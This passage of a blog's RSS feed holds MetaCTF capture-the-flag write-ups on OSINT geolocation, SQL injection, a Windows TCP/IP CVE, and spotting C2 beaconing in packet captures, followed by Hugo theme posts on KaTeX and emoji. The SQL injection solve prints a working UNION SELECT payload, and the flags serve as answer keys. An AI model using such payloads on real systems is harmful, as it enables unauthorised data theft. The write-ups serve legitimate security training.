&lt;p>Did not solve, but was ON THE RIGHT TRACK. At 4AM, I tried changing the OSPF cost BUT I CHANGED THE WRONG INTERFACE&amp;rsquo;S COST. BIG SAD.&lt;/p>
&lt;p>Here is the writeup from another person&amp;hellip; for next time.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/birdShit.png" alt="solve">&lt;/p>
&lt;h1 id="where-in-the-world" >Where in the World
&lt;span>
&lt;a href="#where-in-the-world">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I must say, every time I see one of these directional signs, I think I&amp;rsquo;ve got to make this into a CTF problem. It&amp;rsquo;s the idea of Open Source Intelligence (OSINT) or Geospatial Intelligence (GEOINT). The idea of being able to take an image and use all of the clues within it to infer details such as where it&amp;rsquo;s at or what&amp;rsquo;s happening in the photo.&lt;/p>
&lt;p>Here is one such picture of those signs. Your goal? Use those little details to find the name of the marina it&amp;rsquo;s at which you&amp;rsquo;ll submit for the flag (so MetaCTF{name of marina}&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/sign_of_cities.png" alt="picture">&lt;/p>
&lt;h2 id="solve-5" >Solve
&lt;span>
&lt;a href="#solve-5">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Google image search go brrrr.&lt;/p>
&lt;p>&lt;a href="https://www.google.com/search?tbs=simg:CAESYgm4egF4qbenjhpXCxCwjKcIGjsKOQgEEhSLHvcB1A2jDM8esSSJJsYRqS2wGhobsSNyV5t0GyxbYWZWX4cdF4DSw67Sa_1SydHZ0IAUwBAwLEI6u_1ggaCgoICAESBAXC5ToM&amp;amp;q=marina+&amp;amp;tbm=isch#imgrc=lI4Z2r9ahay2oM">Search&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.google.com/url?sa=i&amp;amp;url=https%3A%2F%2Fwww.facebook.com%2FEgg-Harbor-Marina-Beach-206274509466545%2F&amp;amp;psig=AOvVaw19faRmXpPwUl5JjE_6oYTM&amp;amp;ust=1638681451821000&amp;amp;source=images&amp;amp;cd=vfe&amp;amp;ved=0CAwQjhxqFwoTCJCsmqGyyfQCFQAAAAAdAAAAABAD">Egg Harbor&lt;/a>&lt;/p>
&lt;p>&lt;code>MetaCTF(egg_harbor)&lt;/code>&lt;/p>
&lt;h1 id="yummy-vegetables" >Yummy Vegetables
&lt;span>
&lt;a href="#yummy-vegetables">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.&lt;/p>
&lt;p>Here&amp;rsquo;s some sauce to go with the vegetables: index.js&lt;/p>
&lt;h2 id="solve-6" >Solve
&lt;span>
&lt;a href="#solve-6">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Looking at the JS, we see that a query is sent so you can do a UNION attack on this boi.&lt;/p>
&lt;p>Make sure you have the same number of columns as the first query though.&lt;/p>
&lt;p>To find the number of columns, look at the response after submitting a query (we can just do a empty search).&lt;/p>
&lt;p>&lt;code>UNION SELECT 1, 2, flag FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--1&lt;/code>&lt;/p>
&lt;p>&lt;code>MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}&lt;/code>&lt;/p>
&lt;h1 id="the-best-laid-plain" >The Best Laid Plain
&lt;span>
&lt;a href="#the-best-laid-plain">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Sometimes, routers can break packets up into fragments to meet abnormal networking requirements, and the endpoint will be responsible for putting these back together. Sometimes however, this doesn&amp;rsquo;t go as planned, as Microsoft found out with CVE-2021-24074. We&amp;rsquo;d like to see the function responsible for this vulnerability, but we&amp;rsquo;re having some trouble finding its name&amp;hellip; Could you see if you could find it?&lt;/p>
&lt;h2 id="solve-7" >Solve
&lt;span>
&lt;a href="#solve-7">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>&lt;a href="https://duckduckgo.com/?q=%22CVE-2021-24074%22+writeup&amp;amp;t=ffab&amp;amp;ia=web">https://duckduckgo.com/?q=%22CVE-2021-24074%22+writeup&amp;amp;t=ffab&amp;amp;ia=web&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/">https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/&lt;/a>&lt;/p>
&lt;p>&lt;code>MetaCTF{Ipv4pReceiveRoutingHeader}&lt;/code>&lt;/p>
&lt;h1 id="pattern-of-life" >Pattern of Life
&lt;span>
&lt;a href="#pattern-of-life">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Hackers have breached our network. We know they are there, hiding in the shadows as users continue to browse the web like normal. As a threat hunter, your job is to constantly be searching our environment for any signs of malicious behavior.&lt;/p>
&lt;p>Today you just received a packet capture (pcap) from a user&amp;rsquo;s workstation. We think that an attacker may have compromised the user&amp;rsquo;s machine and that the computer is beaconing out to their command and control (C2) server. Based on some other logs, we also think the attacker was &lt;em>not&lt;/em> using a fully encrypted protocol and also did not put much care into making their C2 server look like a normal website. Your task? We&amp;rsquo;d like you to submit the port number that the C2 server is listening on in the form of MetaCTF{portnumber} as the flag.&lt;/p>
&lt;h2 id="solve-8" >Solve
&lt;span>
&lt;a href="#solve-8">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>So from the prompt, we know we should look at HTTP(S) things. HTTP Command and Control beaconing is a thing.&lt;/p>
&lt;ol>
&lt;li>Look at the HTTP Objects: File -&amp;gt; Export Objects -&amp;gt; HTTP Objects&lt;/li>
&lt;li>Notice the port is 8080&lt;/li>
&lt;/ol>
&lt;p>&lt;code>MetaCTF{8080}&lt;/code>&lt;/p>
&lt;h1 id="the-searcher" >The Searcher
&lt;span>
&lt;a href="#the-searcher">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Alright analyst. We need your help with some investigative work as we dive deeper into one of the infections on our company&amp;rsquo;s network. We&amp;rsquo;ve taken a small packet capture that we know contains some C2 traffic. In order to give us some more leads for the investigation though, we&amp;rsquo;d like to see if we can identify what C2 framework the attacker was using. This will give us some leads into potential host-based artifacts that might be left behind.&lt;/p>
&lt;p>Please submit the name of the C2 Framework being used in the form of MetaCTF{c2frameworkname}&lt;/p>
&lt;h2 id="solve-9" >Solve
&lt;span>
&lt;a href="#solve-9">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Looking at the pcap -&amp;gt; notice the user agent (this is a good way to identify C2 frameworks).&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /en-us/docs.html HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Host: 52.44.115.131:8080
Cookie: ASPSESSIONID=fc1060eace; SESSIONID=1552332971750
HTTP/1.1 200 OK
Date: Mon, 22 Nov 2021 01:33:24 GMT
Content-Type: text/plain; charset=utf-8
Server: Microsoft-IIS/7.5
Transfer-Encoding: chunked
&lt;/code>&lt;/pre>&lt;p>Google search on the SESSIONID: find &lt;a href="https://github.com/sclow/covenant_mgmt/blob/main/config.yml.example">GitHub&lt;/a>&lt;/p>
&lt;p>&lt;code>MetaCTF{Covenant}&lt;/code>&lt;/p></description></item><item><title>Math Typesetting</title><link>https://murphe22.com/posts/math-typesetting/</link><pubDate>Fri, 08 Mar 2019 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/math-typesetting/</guid><description>&lt;p>Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.&lt;/p>
&lt;p>In this example we will be using &lt;a href="https://katex.org/">KaTeX&lt;/a>&lt;/p>
&lt;ul>
&lt;li>Create a partial under &lt;code>/layouts/partials/math.html&lt;/code>&lt;/li>
&lt;li>Within this partial reference the &lt;a href="https://katex.org/docs/autorender.html">Auto-render Extension&lt;/a> or host these scripts locally.&lt;/li>
&lt;li>Include the partial in your templates like so:&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>{{ if or .Params.math .Site.Params.math }}
{{ partial &amp;quot;math.html&amp;quot; . }}
{{ end }}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>To enable KaTex globally set the parameter &lt;code>math&lt;/code> to &lt;code>true&lt;/code> in a project&amp;rsquo;s configuration&lt;/li>
&lt;li>To enable KaTex on a per page basis include the parameter &lt;code>math: true&lt;/code> in content files.&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Note:&lt;/strong> Use the online reference of &lt;a href="https://katex.org/docs/supported.html">Supported TeX Functions&lt;/a>
&lt;/p>
&lt;h3 id="examples" >Examples
&lt;span>
&lt;a href="#examples">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;p>Inline math: $$ \varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887… $$&lt;/p>
&lt;p>Block math:&lt;/p>
&lt;p>$$
\varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
$$&lt;/p></description></item><item><title>Emoji Support</title><link>https://murphe22.com/posts/emoji-support/</link><pubDate>Tue, 05 Mar 2019 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/emoji-support/</guid><description>&lt;p>Emoji can be enabled in a Hugo project in a number of ways.&lt;/p>
&lt;p>The &lt;a href="https://gohugo.io/functions/emojify/">&lt;code>emojify&lt;/code>&lt;/a> function can be called directly in templates or &lt;a href="https://gohugo.io/templates/shortcode-templates/#inline-shortcodes">Inline Shortcodes&lt;/a>.&lt;/p>
&lt;p>To enable emoji globally, set &lt;code>enableEmoji&lt;/code> to &lt;code>true&lt;/code> in your site’s &lt;a href="https://gohugo.io/getting-started/configuration/">configuration&lt;/a> and then you can type emoji shorthand codes directly in content files; e.g.&lt;/p>
&lt;p>&lt;span class="nowrap">&lt;span class="emojify">🙈&lt;/span> &lt;code>:see_no_evil:&lt;/code>&lt;/span> &lt;span class="nowrap">&lt;span class="emojify">🙉&lt;/span> &lt;code>:hear_no_evil:&lt;/code>&lt;/span> &lt;span class="nowrap">&lt;span class="emojify">🙊&lt;/span> &lt;code>:speak_no_evil:&lt;/code>&lt;/span>&lt;/p>
&lt;br>
&lt;p>The &lt;a href="http://www.emoji-cheat-sheet.com/">Emoji cheat sheet&lt;/a> is a useful reference for emoji shorthand codes.&lt;/p>
&lt;hr>
&lt;p>&lt;strong>N.B.&lt;/strong> The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">.emoji {
font-family: Apple Color Emoji,Segoe UI Emoji,NotoColorEmoji,Segoe UI Symbol,Android Emoji,EmojiSymbols;
}&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>